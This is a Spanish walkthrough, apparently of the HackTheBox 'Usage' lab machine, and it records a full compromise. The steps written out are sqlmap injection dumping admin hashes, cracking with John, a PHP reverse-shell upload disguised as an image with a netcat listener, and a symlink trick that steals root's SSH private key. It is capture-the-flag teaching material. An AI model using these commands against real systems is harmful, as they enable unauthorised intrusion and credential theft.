<h1>
    Introducción
</h1>

Para esta primera parte haremos los pasos de siempre:
1. Revisar si podemos hacer ping a la máquina víctima.
2. Hacer un escaneo de puertos.
3. Buscar versiones y servicios activos.

<h3>
    Haciendo ping a la máquina víctima
</h3>

![image](https://hackmd.io/_uploads/rkAwYxdNR.png)

Tenemos conexión y estamos ante una máquina Linux (por el ttl con proximidad a 64)

<h3>
    Escaneando puertos con sus versiones y servicios
</h3>

Encontramos los siguientes puertos abiertos y podemos quedarnos con la siguiente información más importante:

```
PORT         STATE     SERVICE     REASON             VERSION
22/tcp       open      ssh         syn-ack ttl 63     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp       open      http        syn-ack ttl 63     nginx 1.18.0 (Ubuntu)
```

Solo encontramos los servicios ssh y http corriendo en la máquina; empezaremos con la página web, primeramente recopilando información con la herramienta whatweb:

![image](https://hackmd.io/_uploads/H1NLslOVA.png)

Entramos a la página web:

![image](https://hackmd.io/_uploads/S1myhe_ER.png)

Ya que nuestra máquina no puede resolver el dominio dado, añadiremos el dominio al /etc/hosts:

![image](https://hackmd.io/_uploads/H103slO40.png)

Y al recargar la página nos encontramos lo siguiente:

![image](https://hackmd.io/_uploads/SkPb3ed4C.png)

Haciendo un poco de fuzzing web para encontrar directorios ocultos encontramos:
![imagen](https://hackmd.io/_uploads/rJqcNp7LR.png)
Todos los directorios que regresaron código de estado 200 o 302 nos llevan a la misma página que vimos anteriormente, por ello vamos a inspeccionar un poco más dicha página:

![imagen](https://hackmd.io/_uploads/BJP37LLP0.png)

Vemos las tecnologías que usa, ahora vamos a enviar una solicitud e interceptarla con BurpSuite:

![imagen](https://hackmd.io/_uploads/H12-ITmUR.png)

Obtenemos la respuesta desde el Repeater:
![imagen](https://hackmd.io/_uploads/rkb-4L8D0.png)
![imagen](https://hackmd.io/_uploads/BJFzNUUvR.png)

Copiamos toda la solicitud y la pegamos en un archivo llamado "peticion_forgot_password.txt":

![imagen](https://hackmd.io/_uploads/S1VxS8LwR.png)


Probaremos con sqlmap a enviar la solicitud que obtenemos en burpsuite desde la página forgot password con nuestro archivo "peticion_forgot_password.txt":
![imagen](https://hackmd.io/_uploads/BylV1aVIC.png)


Encontramos que la página de forgot password es vulnerable a SQL injection (SQLI):

![imagen](https://hackmd.io/_uploads/HJZkQ6V8C.png)

Usamos el siguiente comando para ver que bases de datos existen:

`sqlmap -r peticion_forgot_password.txt -p email -dbs --threads 10`

Encontramos las bases de datos:
[+] information_schema
[+] performance_schema
[+] usage_blog

Seleccionamos la base de datos `usage_blog` y le aplicamos un dumpeo:

`sqlmap -r peticion_forgot_password.txt -p email -D usage_blog --threads 10 --dump`

![imagen](https://hackmd.io/_uploads/HkNGoaEI0.png)

Seleccionamos la tabla `admin_users` con el comando `sqlmap -r peticion.txt -p email --batch --threads 10 -D usage_blog -T admin_users --dump`

![imagen](https://hackmd.io/_uploads/HyKcRpEIC.png)
Encontramos que el usuario `admin` tiene la contraseña `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`

Probemos autenticarnos en la página web con estas credenciales:
![imagen](https://hackmd.io/_uploads/HJaG88LvC.png)

No logramos entrar por lo que la contraseña debe estar encriptada,
probemos a desencriptarla con el siguiente comando `john hash.txt` de `John The Ripper` donde `hash.txt` contiene la contraseña que encontramos antes `$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2`:

![imagen](https://hackmd.io/_uploads/H1VHVRELC.png)

Agregamos el subdominio admin.usage.htb al /etc/hosts

![imagen](https://hackmd.io/_uploads/SyjqDC4LA.png)

Dentro de la página de Login, clickeamos en el botón Admin e ingresamos las credenciales obtenidas (admin y whatever1)

![imagen](https://hackmd.io/_uploads/BJTAwCVUA.png)
![imagen](https://hackmd.io/_uploads/H1PZ_CNU0.png)
![imagen](https://hackmd.io/_uploads/ByszOCNL0.png)
¡Logramos entrar a la página web como el usuario administrador!
</br>

------------------
<h1>Intrusión a la máquina linux</h1>

Buscando información sobre la página web encontramos que funciona con una versión de laravel que es vulnerable: https://flyd.uk/post/cve-2023-24249/

Probaré con una shell enviada desde php que podemos encontrar en el siguiente repositorio, solo nos aseguramos de cambiar la IP por la nuestra y el puerto a ponernos en escucha:
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Creamos un archivo php con la revshell y extensión .jpg, en mi caso lo llamaré "user2-160x160.jpg":
![imagen](https://hackmd.io/_uploads/Hko4cILvA.png)
![imagen](https://hackmd.io/_uploads/BJ7IqIIvC.png)

En la ruta "http://admin.usage.htb/admin/auth/setting" podemos subir nuestra imagen con una reverse shell, por ello subiremos nuestro archivo creado (en mi caso "user2-160x160.jpg").

Antes de enviar la petición nos ponemos en escucha con netcat por el puerto que pusimos en user2-160x160.jpg (en mi caso el 4444):
![imagen](https://hackmd.io/_uploads/rkjQdIUwC.png)


Enviamos la petición:
![imagen](https://hackmd.io/_uploads/H16mV1BUR.png)

Añadimos la extensión .php y enviamos la petición:
![imagen](https://hackmd.io/_uploads/rJOwNkBIA.png)


Estamos dentro:
![imagen](https://hackmd.io/_uploads/HyP3jkrUA.png)


Obtenemos la flag de user (dash):

![imagen](https://hackmd.io/_uploads/S1rYnkHLA.png)

Vemos que contiene .monitrc:
![imagen](https://hackmd.io/_uploads/H1vtCkBLC.png)
![imagen](https://hackmd.io/_uploads/S1ZCCJSIA.png)
Probamos conectarnos por ssh con la contraseña de la imágen superior:

![imagen](https://hackmd.io/_uploads/HyogkgBUC.png)
![imagen](https://hackmd.io/_uploads/ryBGJeSIC.png)
Solo puedo decir XD

Vemos que podemos ejecutar como superusuario siendo xander:
![imagen](https://hackmd.io/_uploads/HJBKkgHU0.png)

Ejecutando el comando vemos lo siguiente:
![imagen](https://hackmd.io/_uploads/H1bXggHIA.png)

Nos desplazamos a /var
![imagen](https://hackmd.io/_uploads/rJwIllBL0.png)
Parece que el proyecto es una página web (por el directorio /var/www)


Encontramos una vulnerabilidad que puede ayudarnos en HackTricks:
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page


Seguimos los pasos y obtenemos una llave de ssh:

cd /var/www/html

touch @id_rsa

ln -s /root/.ssh/id_rsa id_rsa

sudo /usr/bin/usage_management

![imagen](https://hackmd.io/_uploads/SkJt-xH8R.png)

Copiamos la llave privada de ssh en nuestra máquina:
![imagen](https://hackmd.io/_uploads/H1jq7grIR.png)

Le damos los permisos correctos a la llave privada con `chmod 600 id_rsa`.
Ejecutamos el comando `ssh -i id_rsa root@10.10.11.18` para conectarnos a la máquina víctima:
![imagen](https://hackmd.io/_uploads/HJge4xr80.png)
![imagen](https://hackmd.io/_uploads/rkJyElH80.png)
¡Hallamos la bandera del usuario root!

Espero hayas podido aprender algo nuevo y te haya gustado esta guía, nos vemos la próxima :p.

![imagen](https://hackmd.io/_uploads/rkwFTL8PC.png)

